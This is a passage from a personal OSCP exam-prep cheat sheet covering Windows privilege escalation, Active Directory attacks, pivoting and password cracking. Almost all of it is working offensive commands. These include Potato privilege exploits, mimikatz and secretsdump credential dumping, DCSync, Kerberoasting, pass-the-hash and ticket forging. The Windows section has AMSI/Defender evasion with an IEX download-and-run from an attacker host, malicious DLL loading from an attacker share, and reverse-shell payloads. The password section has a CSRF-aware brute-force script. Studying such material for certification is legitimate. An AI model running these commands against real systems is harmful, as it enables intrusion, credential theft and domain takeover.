# group 'disk' -> debugfs read raw device (read /etc/shadow); group 'video'/'shadow' wins
```

---

## WINDOWS PRIVILEGE ESCALATION

### Enumerate
```powershell
# Automated
.\winPEASany.exe                 # or winpeas.bat
.\PrivescCheck.ps1; Invoke-PrivescCheck
.\Seatbelt.exe -group=all
# Manual
whoami /all                      # PRIVILEGES = gold (SeImpersonate, SeBackup, etc.)
whoami /priv
systeminfo                       # OS/patches -> wesng / windows-exploit-suggester
net user; net localgroup administrators; net user <me>
ipconfig /all; route print; netstat -ano        # internal -> pivot
cmdkey /list                     # stored creds -> runas /savecred
```
```bash
# from your box, map patch level to exploits
python wesng.py systeminfo.txt
```

### SeImpersonate / SeAssignPrimaryToken → Potato (very common service-account → SYSTEM)
```powershell
# Pick by Windows version. If whoami /priv shows SeImpersonatePrivilege:
.\PrintSpoofer64.exe -i -c cmd                      # Win10/2016/2019 - reliable
.\PrintSpoofer64.exe -c "C:\rev.exe"
.\GodPotato-NET4.exe -cmd "cmd /c whoami"           # broad coverage incl 2019/2022
.\JuicyPotatoNG.exe -t * -p C:\rev.exe              # newer JuicyPotato
.\JuicyPotato.exe -l 1337 -p C:\rev.exe -t * -c {CLSID}   # 2016/older (Jeeves pattern)
.\RoguePotato.exe -r LHOST -e "C:\rev.exe" -l 9999
# These are the #1 path off web/service shells. Carry all of them.
```

### SeBackupPrivilege / SeRestorePrivilege (Xen ProLab pattern)
```powershell
# Backup SAM+SYSTEM then secretsdump offline:
reg save HKLM\SAM sam.hive ; reg save HKLM\SYSTEM system.hive
# DC: copy NTDS.dit via diskshadow/robocopy then secretsdump
diskshadow /s script.txt    # create shadow, robocopy ntds.dit + SYSTEM
```
```bash
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
```

### Service misconfigurations
```powershell
# Unquoted service path
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows" | findstr /i """"
# "C:\Program Files\My App\svc.exe" unquoted + writable dir -> drop "Program.exe"
sc qc <svc>
# Weak service permissions (can change binPath)
accesschk.exe /accepteula -uwcqv "Authenticated Users" *      # or use winPEAS output
sc config <svc> binpath= "C:\rev.exe" ; sc stop <svc> ; sc start <svc>
# Writable service binary -> replace the exe (Eloquia/Failure2Ban pattern), restart
# Restart without admin if you have SERVICE_STOP/START rights
```

### AlwaysInstallElevated
```powershell
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# both = 1 ->
msiexec /quiet /qn /i evil.msi     # msfvenom -f msi -p windows/x64/shell_reverse_tcp...
```

### Scheduled tasks / startup / autoruns
```powershell
schtasks /query /fo LIST /v | findstr /i "TaskName Run Author"
# writable task binary or script run as SYSTEM -> replace
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run    # autorun + writable target
```

### DLL hijacking
- App loads a DLL from a writable/missing path → drop a malicious DLL (msfvenom `-f dll`). Find with ProcMon (offline analysis) or known-missing-DLL lists.

### Credential hunting (always do this)
```powershell
# Files
findstr /si password *.txt *.ini *.config *.xml
type C:\Windows\Panther\Unattend.xml ; type C:\Windows\system32\sysprep\*.xml
# Registry
reg query HKLM /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword  # autologon creds
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"     # saved proxy/host
# Stored / Wi-Fi / browser
cmdkey /list ; netsh wlan show profile name=X key=clear
# LSASS / SAM
reg save hklm\sam sam ; reg save hklm\system system   # -> secretsdump (above)
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam"
```

### Other Windows wins
- **NTFS ADS** (Jeeves pattern): `dir /R`, `more < file:stream`, `type ... > file:hidden`.
- **machineKey / cookie forge** (Hercules pattern): leaked `web.config` machineKey → forge `__VIEWSTATE` (ysoserial.net) → RCE.
- **Runas with saved creds:** `runas /savecred /user:admin C:\rev.exe`.
- UAC bypass only if you're admin-but-not-elevated (fodhelper, etc.).

### PowerUp (classic automated PE checks)
```powershell
. .\PowerUp.ps1
Invoke-AllChecks                        # runs every check at once
Invoke-ServiceAbuse -Name 'vulnsvc' -Command "net localgroup administrators me /add"
Write-ServiceBinary ; Install-ServiceBinary ; Restart-Service vulnsvc
Get-ModifiableServiceFile ; Get-UnquotedService ; Find-PathDLLHijack
```

### Privileged group membership → SYSTEM/DA  (check `whoami /groups`, `net localgroup`)
```powershell
# Backup Operators -> SeBackupPrivilege: read SAM+SYSTEM (or NTDS on DC) then secretsdump
reg save hklm\sam sam ; reg save hklm\system system        # -> impacket-secretsdump LOCAL
# DnsAdmins -> load malicious DLL into dns.exe (runs SYSTEM on the DC):
dnscmd <dc> /config /serverlevelplugindll \\LHOST\share\evil.dll
sc.exe \\<dc> stop dns & sc.exe \\<dc> start dns
# Server Operators -> change a service binPath, start it (SYSTEM):
sc config <svc> binPath= "C:\rev.exe" & sc stop <svc> & sc start <svc>
# Print Operators -> SeLoadDriverPrivilege -> load Capcom.sys driver -> SYSTEM
# Account Operators -> create/modify non-protected accounts (add to nested groups)
# Hyper-V Admins, Event Log Readers (grep logs for creds), DPAPI/cred vaults
```

### Other token privileges (`whoami /priv`)
```
SeLoadDriverPrivilege     -> load vulnerable signed driver (Capcom.sys) -> SYSTEM
SeManageVolumePrivilege   -> arbitrary file write as SYSTEM (SeManageVolumeExploit.exe)
SeTakeOwnershipPrivilege  -> take ownership of a SYSTEM binary/file, then replace/read it
SeDebugPrivilege          -> procdump/mimikatz into lsass; inject into SYSTEM process
SeRestorePrivilege        -> overwrite protected files (utilman.exe / sethc.exe sticky-keys trick)
SeImpersonate/SeAssignPrimaryToken -> Potato (see above)   SeBackup -> reg save / NTDS
```

### Getting payloads to run (AV / AMSI / Defender)
```powershell
Get-MpComputerStatus ; Get-MpPreference | select Exclusion*   # status + exclusion dirs (drop payload there)
# AMSI: in-memory download dodges on-disk scanning:
IEX(New-Object Net.WebClient).DownloadString('http://LHOST/x.ps1')
# Signatured binary (PrintSpoofer/nc/GodPotato sometimes flagged): rename it, recompile your own,
#   or run from an AV exclusion path. AMSI patch one-liners exist (obfuscate the strings).
# If you're already admin: Set-MpPreference -DisableRealtimeMonitoring $true
```

---

## ACTIVE DIRECTORY (the 40-point set — prioritize this)

> You start the AD set WITH a low-priv domain credential ("assumed breach"). Goal: pivot host→host→DC.
> Reminder: **Responder poisoning is BANNED on the exam.** **Metasploit can't be used for pivoting** (AD spans 3 hosts).

### Enumerate the domain (with your given creds)
```bash
# nxc / NetExec is your swiss army knife
nxc smb $IP -u user -p pass --shares --users --groups --pass-pol
nxc smb $IP -u user -p pass --rid-brute            # enumerate all users
nxc ldap $IP -u user -p pass --bloodhound -c all --dns-server $IP
# BloodHound collection
bloodhound-python -u user -p pass -d target.htb -ns $IP -c all --zip
# or on Windows target: .\SharpHound.exe -c All
# LDAP dumps
ldapdomaindump -u 'target\user' -p pass $IP
# PowerView (on a Windows shell)
. .\PowerView.ps1
Get-NetUser | select samaccountname,description
Get-NetGroup "Domain Admins" -MemberOf
Find-LocalAdminAccess        # where can current user RDP/admin
Get-NetComputer -FullData
```
**Always read user `description` fields and SMB shares — creds hide there.**

### Get a first credential / hash
```bash
# AS-REP roast (users with "do not require preauth") - NO creds needed if you have usernames
impacket-GetNPUsers target.htb/ -dc-ip $IP -usersfile users.txt -no-pass -format hashcat
nxc ldap $IP -u user -p pass --asreproast asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt

# Kerberoast (any valid domain cred -> SPN accounts' TGS hashes)
impacket-GetUserSPNs target.htb/user:pass -dc-ip $IP -request -outputfile kerb.txt
nxc ldap $IP -u user -p pass --kerberoasting kerb.txt
hashcat -m 13100 kerb.txt rockyou.txt

# Password spray (careful with lockout policy from --pass-pol)
nxc smb $IP -u users.txt -p 'Season2025!' --continue-on-success
kerbrute passwordspray -d target.htb users.txt 'Password1'
```

### ACL / object abuse (BloodHound shows the path)
```powershell
# ForceChangePassword on a user (Garfield pattern)
net rpc password "victim" "NewPass123!" -U "target.htb"/"me"%"mypass" -S $IP
# or PowerView:
Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
# GenericAll / GenericWrite on user -> set SPN then kerberoast (targeted), or shadow creds
Set-DomainObject -Identity victim -Set @{serviceprincipalname='fake/x'}   # then kerberoast
# GenericWrite on user -> TARGETED AS-REP roast (no SPN needed): flip DONT_REQ_PREAUTH,
#   roast, then revert. If the account is disabled, clear ACCOUNTDISABLE FIRST or the roast fails:
bloodyAD -u me -p pass -d target.htb --host $IP add uac victim -f DONT_REQ_PREAUTH
impacket-GetNPUsers target.htb/ -dc-ip $IP -request-user victim -no-pass -format hashcat
bloodyAD -u me -p pass -d target.htb --host $IP remove uac victim -f DONT_REQ_PREAUTH   # cleanup
# GenericAll on group -> add yourself
net group "Target Group" me /add /domain
# GenericAll on computer / shadow credentials (modern):
certipy shadow auto -u me@target.htb -p pass -account VICTIM$ -dc-ip $IP
```

### Credential dumping & lateral movement
```bash
# Dump secrets (needs admin on target)
impacket-secretsdump 'target.htb/user:pass@'$IP
impacket-secretsdump -hashes :NThash 'target.htb/user@'$IP
nxc smb $IP -u user -p pass --sam --lsa
# Pass-the-Hash / Pass-the-Password lateral exec
nxc smb <subnet> -u user -H NThash                  # spray hash across hosts
impacket-psexec target.htb/user@$IP -hashes :NThash
impacket-wmiexec target.htb/user@$IP -hashes :NThash     # quieter than psexec
impacket-smbexec / impacket-atexec / impacket-dcomexec
evil-winrm -i $IP -u user -H NThash                 # if WinRM open
# Overpass-the-hash / Pass-the-Ticket
impacket-getTGT target.htb/user -hashes :NThash ; export KRB5CCNAME=user.ccache
impacket-psexec -k -no-pass target.htb/user@dc01.target.htb
```

### To Domain Admin / DC
```bash
# DCSync (needs Replication rights / DA-equiv ACL)
impacket-secretsdump -just-dc target.htb/user:pass@$IP
nxc smb $IP -u user -p pass -M ntdsutil           # if admin
# Pass the krbtgt hash if dumped = golden ticket (usually overkill for exam; prefer DCSync->admin)
# Once you have Administrator/DA NT hash:
impacket-psexec -hashes :<admin_nthash> administrator@<dc_ip>
```

### Ticket forging — Silver vs Golden (know which hash forges what)
First untangle the terminology, it trips people up:
- **NT hash** = `MD4(UTF-16LE(password))`. This *is* "the NTLM hash" people mean for PtH/ticketer.
- **NetNTLMv2** = the challenge-response blob (Responder/coercion). **Cannot be passed** — you *crack* it to get the password, then derive the NT hash.
```bash
# NT hash from a cleartext password you cracked:
python3 -c 'import hashlib;print(hashlib.new("md4","P@ssw0rd!".encode("utf-16le")).hexdigest())'
```
`impacket-ticketer` forges two different things — pick by what key material you hold:
```bash
# SILVER ticket: service account's NT hash + domain SID + SPN.
#   Forges a TGS for THAT ONE service only, as any user (e.g. administrator).
impacket-ticketer -nthash <svc_NT> -domain-sid <SID> -domain corp.local \
  -spn MSSQLSvc/sql01.corp.local:1433 administrator
export KRB5CCNAME=administrator.ccache
impacket-mssqlclient -k sql01.corp.local        # then enable_xp_cmdshell -> RCE as the svc/SYSTEM

# GOLDEN ticket: krbtgt NT hash (or AES key) + domain SID. Forges a TGT for ANYONE, anywhere.
#   Needs krbtgt -> you must already be DCSync-capable / on the DC. A service acct hash will NOT do this.
impacket-ticketer -nthash <krbtgt_NT> -domain-sid <SID> -domain corp.local administrator
```
> Confirm the SPN actually maps to the account (`setspn` / BloodHound) before forging a silver ticket — it only works against the service that account runs. If the DC enforces AES, swap `-nthash` for `-aesKey <aes256>`. For the exam, silver tickets are a stepping stone (RCE on one service → escalate); a golden ticket means you already won (had krbtgt).

### Useful AD glue
- Time sync if Kerberos errors (`KRB_AP_ERR_SKEW`): `sudo ntpdate $DC` or `sudo timedatectl set-ntp off; sudo rdate -n $DC`.
- `KDC_ERR_WRONG_REALM`: your realm string doesn't match the AD domain's **full DNS name**. Set `$DOMAIN` to the exact FQDN (e.g. `corp.local`, not `corp`), uppercase it in `krb5.conf`'s `[libdefaults] default_realm`.
- Picky/locked-down DC throwing odd Kerberos errors: in `/etc/krb5.conf` set `rdns = false` and `dns_canonicalize_hostname = false` under `[libdefaults]`, and always target the DC by **FQDN** (matches the SPN). Get a TGT with `impacket-getTGT corp.local/user:pass` then `export KRB5CCNAME=user.ccache` and add `-k -no-pass` to impacket/nxc.
- Add DC + domain to `/etc/hosts`; use FQDN for Kerberos.
- `--local-auth` flag on nxc for local (non-domain) accounts.
- MSSQL linked-server double-hop (POO pattern): `EXEC ('xp_cmdshell ...') AT [LINKED]`.

### rpcclient / kerbrute enumeration (no creds)
```bash
rpcclient -U "" -N $IP                     # null session
rpcclient -U "target.htb\guest%" $IP       # guest
# inside rpcclient: enumdomusers ; queryuser 0x<rid> ; enumdomgroups ; querygroupmem 0x<rid>
#   getdompwinfo (lockout policy!) ; lsaenumsid ; lookupnames administrator ; netshareenum
kerbrute userenum -d target.htb --dc $IP users.txt   # valid usernames, no creds needed
# parse BloodHound user JSON for descriptions (creds hide there):
jq '.data[]|select(.Properties.description!=null)|{n:.Properties.name,d:.Properties.description}' users.json
```

### Mimikatz / credential extraction (need admin/SYSTEM)
```
privilege::debug
sekurlsa::logonpasswords        # plaintext + NTLM from LSASS
sekurlsa::ekeys                 # kerberos keys -> PtT / overpass-the-hash
lsadump::sam                    # local SAM   |   lsadump::cache (cached domain creds)
lsadump::dcsync /user:target\krbtgt        # DCSync (needs replication rights)
vault::cred  /  sekurlsa::dpapi            # stored / DPAPI creds
# Offline (SeDebug): procdump -accepteula -ma lsass.exe l.dmp -> pypykatz lsa minidump l.dmp
```

### Delegation (only if BloodHound flags it — usually beyond core OSCP scope)
```bash
# Constrained (TRUSTED_TO_AUTH_FOR_DELEGATION): impersonate via S4U
impacket-getST -spn cifs/target -impersonate administrator 'dom/svc:pass'
# RBCD (you have GenericWrite on a computer object): set msDS-AllowedToActOnBehalfOfOtherIdentity
#   then impacket-getST -spn ... -impersonate administrator. Tools: rubeus s4u.
# Unconstrained: coerce a DC auth (printerbug/PetitPotam) then grab its TGT. Note scope before sinking time.
```

### Find creds across the domain (after a foothold)
```bash
Snaffler.exe -s -o snaffler.log              # hunt shares for creds/keys/configs (Windows)
nxc smb <subnet> -u u -p p -M spider_plus    # spider readable shares
manspider <subnet> -u u -p p -c password     # grep file CONTENTS across all shares
# GPP cached creds in SYSVOL (Groups.xml etc.) -> decrypt the AES blob:
nxc smb $IP -u u -p p -M gpp_password ; gpp-decrypt <cpassword>
# LAPS local-admin passwords (if readable):
nxc ldap $IP -u u -p p -M laps
```
> A **writable share isn't only a cred source — it's a code-exec vector.** If a higher-priv user or a scheduled process auto-loads content from a path you can write (VS Code extensions / `extensions.json`, startup scripts, profile/`Documents` paths, an app's plugin dir, Outlook rules), plant a payload there and it runs **in their context** → lateral movement without their password. Check share ACLs with `smbcacls`/BloodHound; SID-based ACLs survive object recreation.

### Sealed LDAP, object restore & newer primitives
- **LDAP signing / channel-binding enforced** (binds fail with `strongerAuthRequired`, or BloodHound collectors choke on plain LDAP)? Many tools can't seal a plain bind. Use **bloodyAD** (NTLM sealing built in) for read/write, or run everything over **Kerberos** (`getTGT` + ccache, krb5.conf as above). If LDAPS (636) just resets, there's no LDAPS cert on the DC → go NTLM-sealed/Kerberos, don't fight 636.
```bash
bloodyAD -u user -p pass -d corp.local --host dc01.corp.local get writable   # what can I edit?
# legacy bloodhound-python can't seal plain binds; rusthound-ce hits the same wall w/o Kerberos.
# collect via Kerberos ccache, or use bloodyAD to walk ACLs directly.
```
- **Tombstone reanimation** (restore a deleted AD object): with `WRITE` on a deleted (tombstoned) object **and** `CREATE_CHILD` on a target OU, undelete it back into the directory — useful when a privileged-but-removed account is the intended path:
```bash
bloodyAD -u user -p pass -d corp.local --host dc01.corp.local set restore <deletedObj> \
  --newParent OU=Employees,DC=corp,DC=local
```
- **BadSuccessor / dMSA** (Windows **Server 2025** only): with `CreateChild` on an OU, create a `msDS-DelegatedManagedServiceAccount` that "supersedes" a privileged account, then request its TGT — the KDC grants the predecessor's privileges. Tools: `SharpSuccessor`, NetExec `badsuccessor` module, `bloodyAD` badSuccessor. Point the create at an **OU where `CreateChild` is confirmed** (not a user DN) and run as the principal holding that right. **Out of current OSCP exam scope** (no 2025 DCs on the exam) — lab/HTB only.
- **Shadow credentials** (`msDS-KeyCredentialLink`, via Whisker/certipy) need **PKINIT / AD CS** on the DC. If PKINIT is disabled (`KDC_ERR_PADATA_TYPE_NOSUPP` on cash-out, 636 resets with no cert), shadow creds are a **dead end** — pivot to targeted AS-REP/kerberoast or password reset instead. Don't keep retrying Whisker.

### OSCP-scope note
Focus drills: AS-REP roast, Kerberoast, password spray, ACL abuse (ForceChangePassword / GenericAll / GenericWrite), PtH/PtT lateral movement, secretsdump, DCSync. **Above exam scope** (skip unless needed): RODC golden tickets, KeyList attacks, ESC16/advanced ADCS, unconstrained-delegation printerbug chains, BadSuccessor/dMSA (Server 2025).

---

## PIVOTING / PORT FORWARDING / TUNNELING

> Needed for AD (reach hosts behind a foothold) and for internal-only services. **Metasploit is NOT allowed for pivoting** — use the below.

### ligolo-ng (recommended — clean, fast, full subnet access)
```bash
# On YOUR box (proxy/server):
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert                 # starts listener on :11601
# add route to target internal subnet (do AFTER agent connects, in ligolo console):
#   session -> select agent -> then on your box:
sudo ip route add 10.10.20.0/24 dev ligolo
# On the FOOTHOLD host (agent):
./agent -connect LHOST:11601 -ignore-cert
# In ligolo console: session ; start    -> now reach 10.10.20.0/24 directly with ANY tool
# Expose a local listener to the agent network (for reverse shells back): 
#   listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443
```

### chisel (SOCKS proxy via HTTP — Dante pattern)
```bash
# Your box (server):
./chisel server -p 8000 --reverse
# Foothold (client) -> reverse SOCKS5:
./chisel client LHOST:8000 R:1080:socks
# Then proxychains everything:
#   /etc/proxychains4.conf -> socks5 127.0.0.1 1080
proxychains nxc smb 10.10.20.0/24 -u user -p pass
proxychains nmap -sT -Pn 10.10.20.5
# Forward a single internal port out instead of SOCKS:
./chisel client LHOST:8000 R:3389:10.10.20.5:3389
```

### SSH tunneling (when you have SSH creds/keys)
```bash
ssh -L 8080:127.0.0.1:8080 user@$IP        # local: hit target's internal :8080 on your 8080
ssh -R 9001:127.0.0.1:9001 user@$IP        # remote: expose your service to target
ssh -D 1080 user@$IP                       # dynamic SOCKS -> proxychains
ssh -fN -L ...                             # background, no shell
# Reach a 3rd host through the SSH host:
ssh -L 3389:10.10.20.5:3389 user@$IP
```

### sshuttle (VPN-like, no proxychains needed)
```bash
sshuttle -r user@$IP 10.10.20.0/24 --ssh-cmd "ssh -i key"
```

### Windows pivot
```cmd
# No nmap on the pivot host? scan from PowerShell (LOLBin):
powershell -c "1..1024 | % { if((New-Object Net.Sockets.TcpClient).ConnectAsync('10.10.20.5',$_).Wait(200)){\"$_ open\"} }"
Test-NetConnection -Port 445 10.10.20.5
# plink (CLI PuTTY) reverse tunnel when no OpenSSH:
plink.exe -ssh -l kali -pw PASS -R 127.0.0.1:3389:10.10.20.5:3389 LHOST
# plink (chisel-style) or netsh portproxy:
netsh interface portproxy add v4tov4 listenport=3389 listenaddress=0.0.0.0 connectport=3389 connectaddress=10.10.20.5
# socat relay (if available)
socat TCP-LISTEN:8080,fork TCP:10.10.20.5:80
```

### proxychains tips
- Use `-sT` (TCP connect) with nmap over proxychains; SYN scans don't work.
- Set `proxy_dns` off for speed; lower timeouts in conf if scans crawl.

---

## PASSWORD ATTACKS & CRACKING

### Identify the hash
```bash
hashid '<hash>' ; hash-identifier ; nth '<hash>'      # name-that-hash
# NT hash from a known/cracked password (for PtH / ticketer / -k workflows):
python3 -c 'import hashlib;print(hashlib.new("md4","PASSWORD".encode("utf-16le")).hexdigest())'
# (NT hash == "the NTLM hash"; NetNTLMv2 is a crackable challenge-response, NOT passable — see AD file)
```

### hashcat (your RTX 3070 setup — CUDA)
```bash
hashcat -m <mode> hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m <mode> hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
# Common modes:
#  0 MD5 | 100 SHA1 | 1400 SHA256 | 1800 sha512crypt($6$) | 500 md5crypt($1$)
#  3200 bcrypt | 1000 NTLM | 5600 NetNTLMv2 | 13100 Kerberoast TGS | 18200 AS-REP
#  22921 KeePass | 13400 KeePass(kdbx) | 13000 RAR5 | 17200/13600 ZIP | 1700 SHA512
hashcat -m 1000 nt.txt rockyou.txt          # NTLM
hashcat -m 13100 kerb.txt rockyou.txt       # kerberoast
hashcat --show -m <mode> hashes.txt         # display cracked
```

### john
```bash
john --wordlist=rockyou.txt hashes.txt
john --show hashes.txt
# format conversions (the *2john tools):
ssh2john id_rsa > h ; keepass2john f.kdbx > h ; zip2john f.zip > h
office2john doc.docx > h ; pdf2john f.pdf > h ; gpg2john ...
john --wordlist=rockyou.txt h
```

### Online / service brute (hydra) — mind lockouts
```bash
hydra -l user -P rockyou.txt $IP ssh -t 4
hydra -L users.txt -P pass.txt $IP smb
hydra -l admin -P rockyou.txt $IP http-post-form "/login:user=^USER^&pass=^PASS^:Invalid" 
hydra -l user -P pass.txt ftp://$IP
```
**Hydra can't beat a CSRF/anti-forgery token.** If the login form has a hidden per-request token (`name="csrf"`, `__RequestVerificationToken`, etc.) the app validates server-side, Hydra reuses a stale token and the server returns "invalid token" for *every* try — so your failure string never matches and **every password looks like a hit** (false positives). Hydra can't scrape+reinject a fresh token per request. Drop to a tiny Python session script:
```python
import requests, re, sys
URL = "http://TARGET/login"
for pw in open("rockyou.txt", encoding="latin-1", errors="ignore"):
    pw = pw.strip()
    s = requests.Session()                       # fresh session each try
    tok = re.search(r'name="csrf" value="([^"]+)"', s.get(URL).text).group(1)
    r = s.post(URL, data={"csrf": tok, "username": "admin", "password": pw},
               allow_redirects=False)
    if r.status_code == 302:                     # or: "Wrong" not in r.text
        print("[+] FOUND:", pw); sys.exit()
```
> Key the success check on a **reliable** signal (a 302 redirect to a dashboard is best; otherwise the *absence* of both the "wrong password" AND the "invalid token" strings). Two requests per attempt makes full rockyou slow — thread it or use a targeted list (cewl/`--rules`).

### Crack /etc/shadow
```bash
unshadow /etc/passwd /etc/shadow > combined
john --wordlist=rockyou.txt combined        # or hashcat -m 1800 for $6$
```

### Wordlist mangling
```bash
# from website
cewl http://$IP -w words.txt -d 3 -m 5
# variations
hashcat --stdout words.txt -r rules/best64.rule | sort -u > big.txt
# username lists from names
./username-anarchy Firstname Lastname
```

---

## EXAM REPORT (no points without it — don't fumble the deliverable)
- Use the **official OffSec OSCP/OSCP+ report template** (.docx). Download and fill it offline.
- **One section per machine:** ports/services → foothold (exact request/exploit + URL/CVE) → `local.txt` proof → privesc steps → `proof.txt` proof.
- Every claim needs a **screenshot showing the command, its output, and `whoami`/`id`/`ipconfig` + the target IP in frame**.
- Write commands verbatim so a grader can **reproduce** each step. Note any exploit you modified.
- **AD set:** document the full chain host-by-host — how you got each credential and each hop to the DC.
- Workflow: keep per-box markdown notes during the exam → paste into the template afterward. (No AI for writing the report either.)
- Export to a **single PDF**, submit to the OffSec portal **within 24h** of the window closing.
- Unproven flags / missing screenshots = lost points. **When unsure, screenshot it.**

---

## QUICK-REFERENCE APPENDIX

### Common ports (memorize the cluster)
```
21 FTP | 22 SSH | 23 Telnet | 25 SMTP | 53 DNS | 80/443 HTTP(S) | 88 Kerberos(DC)
110 POP3 | 111 RPC/NFS | 135/139/445 SMB-RPC | 143 IMAP | 161 SNMP(UDP) | 389/636 LDAP
1433 MSSQL | 3306 MySQL | 3389 RDP | 5432 Postgres | 5985/5986 WinRM | 6379 Redis
```
Seeing 88 + 389 + 445 + 5985 together = **Domain Controller**. 53+88 too.

### Decision flow (per box)
```
nmap -> /etc/hosts -> per-port enum -> web dirbust -> identify version/CVE/default creds
  -> FOOTHOLD (web exploit / public exploit / creds) -> stabilize shell -> screenshot local.txt
  -> linpeas/winpeas + manual -> sudo -l / whoami /priv FIRST
  -> PRIVESC -> screenshot proof.txt -> document + move on
AD: given creds -> bloodhound -> roast/ACL/spray -> lateral (PtH) -> secretsdump -> DCSync -> DA
```

### When stuck (run the checklist before switching)
- Re-read ALL nmap output + every script line. Did you scan UDP? all 65535 TCP?
- Did you check **every** SMB share / web vhost / user `description`?
- Did you try found creds **everywhere** (SSH, SMB, RDP, WinRM, web, su)?
- `sudo -l` / `whoami /priv` done? GTFOBins/LOLBAS the binary?
- Any internal-only port in `ss -tlnp` / `netstat -ano` you haven't forwarded out?
- Backup/config/history files read? `.git`? source via php filter?
- For AD: re-collect BloodHound as the NEW user after each cred — paths change.
- Version too obscure for searchsploit? Search the exact `name + version + "exploit"` (cached refs).

### Reverse shell stabilize (one-liner recap)
```
python3 -c 'import pty;pty.spawn("/bin/bash")'  ; Ctrl+Z ; stty raw -echo; fg ; export TERM=xterm
```

### secretsdump / PtH recap
```
impacket-secretsdump 'dom/user:pass@IP'      # dump
impacket-wmiexec dom/user@IP -hashes :NThash # use the hash
evil-winrm -i IP -u user -H NThash
```

### Offline reference stash to prepare BEFORE exam (no AI/internet-AI allowed)
HackTricks (book.hacktricks.xyz), GTFOBins, LOLBAS, PayloadsAllTheThings, revshells.com cheats,
hashcat mode table, Impacket/nxc help dumps, your own per-box notes. Keep binaries staged:
linpeas, winPEASany, pspy64, chisel (lin+win), ligolo (proxy+agent), PrintSpoofer64, GodPotato,
JuicyPotatoNG, PowerView, SharpHound, mimikatz, PwnKit, bloodyAD (sealed LDAP / ACL abuse).

---

*Built as a personal prep reference. Source: general pentest methodology + technique knowledge, cross-checked for coverage gaps against public OSCP checklists (crtvrffnrt/OSCP-Checklist-Cheatsheet2024, BlessedRebuS/OSCP-Pentesting-Cheatsheet, fatalxs/oscp-cheatsheet) and HackTricks/GTFOBins/PayloadsAllTheThings, and verified against the official OSCP+ exam rules (2026). All commands written fresh — not copied from any cert-lab/PG box walkthrough. AI tools are not permitted during the live exam or report phase — this file is offline notes.*
